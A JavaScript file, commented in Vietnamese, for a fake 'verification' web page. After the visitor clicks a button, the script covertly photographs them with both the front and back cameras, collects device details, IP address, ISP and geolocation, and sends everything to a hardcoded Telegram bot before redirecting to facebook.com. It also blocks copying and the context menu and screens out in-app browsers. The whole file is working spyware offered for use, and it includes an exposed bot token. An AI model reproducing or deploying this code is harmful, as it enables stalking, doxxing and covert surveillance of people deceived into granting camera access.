// ==================== CONFIG ====================
const CONFIG = {
    REDIRECT_URL: "https://facebook.com",
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    TELEGRAM_API: "https://api.telegram.org/bot",
    COUNTDOWN_SECONDS: 3
};

const LOCATION_APIS = [
    'https://ipwho.is/',
    'https://ipapi.co/json/',
    'https://freeipapi.com/api/json/',
    'https://ip-api.com/json/'
];

// ==================== DEVICE INFO ====================
const DeviceInfo = {
    getInfo() {
        const ua = navigator.userAgent;
        
        let device = 'Không xác định';
        let os = 'Không xác định';
        
        if (/iPhone|iPad|iPod/i.test(ua)) {
            os = 'iOS';
            device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
        } else if (/Android/i.test(ua)) {
            os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (ua.includes('Windows')) {
            os = 'Windows';
            device = 'PC/Laptop';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            device = 'Mac';
        } else {
            os = 'Desktop';
            device = 'PC/Laptop';
        }
        
        return { device, os };
    }
};

// ==================== LOCATION INFO ====================
const LocationInfo = {
    async getLocationData() {
        for (const api of LOCATION_APIS) {
            try {
                const response = await fetch(api, { mode: 'cors' });
                const data = await response.json();
                
                if (data.success !== false && data.ip) {
                    return {
                        ip: data.ip,
                        isp: data.connection?.isp || data.isp || 'Không xác định',
                        country: data.country || 'Không xác định',
                        city: data.city || 'Không xác định',
                        region: data.region || 'Không xác định',
                        lat: data.latitude || 'Không xác định',
                        lon: data.longitude || 'Không xác định',
                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định'
                    };
                }
                
                if (data.ip && data.country_name) {
                    return {
                        ip: data.ip,
                        isp: data.org || data.asn || 'Không xác định',
                        country: data.country_name || 'Không xác định',
                        city: data.city || 'Không xác định',
                        region: data.region || 'Không xác định',
                        lat: data.latitude || 'Không xác định',
                        lon: data.longitude || 'Không xác định',
                        location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định'
                    };
                }
                
                if (data.ipAddress) {
                    return {
                        ip: data.ipAddress,
                        isp: 'Không xác định',
                        country: data.country || 'Không xác định',
                        city: data.city || 'Không xác định',
                        region: data.region || 'Không xác định',
                        lat: data.latitude || 'Không xác định',
                        lon: data.longitude || 'Không xác định',
                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định'
                    };
                }
                
                if (data.status === 'success') {
                    return {
                        ip: data.query,
                        isp: data.isp || 'Không xác định',
                        country: data.country || 'Không xác định',
                        city: data.city || 'Không xác định',
                        region: data.regionName || 'Không xác định',
                        lat: data.lat || 'Không xác định',
                        lon: data.lon || 'Không xác định',
                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định'
                    };
                }
                
            } catch(e) {}
        }
        
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip,
                    isp: 'Không xác định',
                    country: 'Không xác định',
                    city: 'Không xác định',
                    region: 'Không xác định',
                    lat: 'Không xác định',
                    lon: 'Không xác định',
                    location: 'Không xác định'
                };
            }
        } catch(e) {}
        
        return {
            ip: 'Không xác định',
            isp: 'Không xác định',
            country: 'Không xác định',
            city: 'Không xác định',
            region: 'Không xác định',
            lat: 'Không xác định',
            lon: 'Không xác định',
            location: 'Không xác định'
        };
    }
};

// ==================== CAMERA MANAGER ====================
const CameraManager = {
    stream: null,
    videoElement: null,
    
    init(videoElement) {
        this.videoElement = videoElement;
    },
    
    async requestCamera(facingMode = 'user') {
        if (!navigator.mediaDevices?.getUserMedia) {
            return null;
        }
        
        try {
            if (this.stream) {
                this.stopCamera();
            }
            
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode } },
                audio: false
            });
            
            if (this.videoElement) {
                this.videoElement.srcObject = this.stream;
                this.videoElement.style.display = 'block';
                await this.videoElement.play();
            }
            
            return this.stream;
            
        } catch(e) {
            try {
                this.stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                    audio: false
                });
                
                if (this.videoElement) {
                    this.videoElement.srcObject = this.stream;
                    this.videoElement.style.display = 'block';
                    await this.videoElement.play();
                }
                
                return this.stream;
            } catch(e2) {
                return null;
            }
        }
    },
    
    async capturePhoto() {
        if (!this.videoElement || !this.stream) {
            return null;
        }
        
        await new Promise(r => setTimeout(r, 500));
        
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = this.videoElement.videoWidth;
            canvas.height = this.videoElement.videoHeight;
            
            if (canvas.width === 0 || canvas.height === 0) {
                resolve(null);
                return;
            }
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(this.videoElement, 0, 0);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    },
    
    async captureBothCameras() {
        const photos = { front: null, back: null };
        
        // Chụp camera trước
        const frontStream = await this.requestCamera('user');
        if (frontStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.front = await this.capturePhoto();
        }
        
        // Chụp camera sau
        const backStream = await this.requestCamera('environment');
        if (backStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.back = await this.capturePhoto();
        }
        
        return photos;
    },
    
    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        if (this.videoElement) {
            this.videoElement.srcObject = null;
            this.videoElement.style.display = 'none';
        }
    }
};

// ==================== TELEGRAM SENDER ====================
const TelegramSender = {
    async sendMessage(text) {
        const url = `${CONFIG.TELEGRAM_API}${CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        
        const url = `${CONFIG.TELEGRAM_API}${CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {}
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌍 *IP:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || '?'}
🏙️ *Địa chỉ:* ${data.location || '?'}
🌎 *Quốc gia:* ${data.country || '?'}
📍 *Vĩ độ:* ${data.lat || '?'}
📍 *Kinh độ:* ${data.lon || '?'}
📌 *Google Maps:* ${data.maps || 'Không có'}
📸 *Camera trước:* ${data.frontCamera || '?'}
📸 *Camera sau:* ${data.backCamera || '?'}
⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        
        if (data.frontPhoto) {
            await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        }
        
        if (data.backPhoto) {
            await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
        }
    }
};

// ==================== MAIN ====================
(function() {
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    const ua = navigator.userAgent;
    const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
    if (isInApp) {
        warningDiv.style.display = 'block';
        mainCard.style.display = 'none';
    }
    
    // Chặn copy, context menu
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    // Khởi tạo camera
    CameraManager.init(video);
    
    // Xử lý khi bấm nút
    startBtn.onclick = async () => {
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        
        try {
            statusDiv.innerHTML = '📷 Đang mở camera...';
            msg.textContent = '📷 Đang mở camera...';
            msg.style.display = 'block';
            
            // Chụp cả 2 camera
            const photos = await CameraManager.captureBothCameras();
            
            video.style.display = 'none';
            msg.textContent = '📸 Đang xử lý...';
            statusDiv.innerHTML = '📸 Đang xác thực...';
            
            // Lấy thông tin
            const deviceInfo = DeviceInfo.getInfo();
            const locationInfo = await LocationInfo.getLocationData();
            
            // Tổng hợp dữ liệu
            const finalData = {
                time: new Date().toLocaleString('vi-VN'),
                device: deviceInfo.device,
                os: deviceInfo.os,
                ip: locationInfo.ip,
                isp: locationInfo.isp,
                location: locationInfo.location,
                country: locationInfo.country,
                lat: locationInfo.lat,
                lon: locationInfo.lon,
                maps: locationInfo.lat !== 'Không xác định' ? `https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}` : '',
                frontCamera: photos.front ? '✅ Đã chụp' : '🚫 Không chụp được',
                backCamera: photos.back ? '✅ Đã chụp' : '🚫 Không chụp được',
                note: 'Đã chụp cả camera trước và sau.',
                frontPhoto: photos.front,
                backPhoto: photos.back
            };
            
            // Gửi Telegram
            await TelegramSender.sendAll(finalData);
            
            // Dừng camera
            CameraManager.stopCamera();
            
            // Đếm ngược
            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${CONFIG.COUNTDOWN_SECONDS} giây...`;
            
            let timeLeft = CONFIG.COUNTDOWN_SECONDS;
            const timer = setInterval(() => {
                startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    if (CONFIG.REDIRECT_URL) {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }
                }
            }, 1000);
            
        } catch(error) {
            console.error('Lỗi:', error);
            statusDiv.innerHTML = '❌ Có lỗi xảy ra, vui lòng thử lại!';
            startBtn.disabled = false;
            startBtn.innerText = '▶ BẮT ĐẦU XÁC THỰC';
            CameraManager.stopCamera();
        }
    };
    
    console.log('✅ Hệ thống sẵn sàng!');
})();
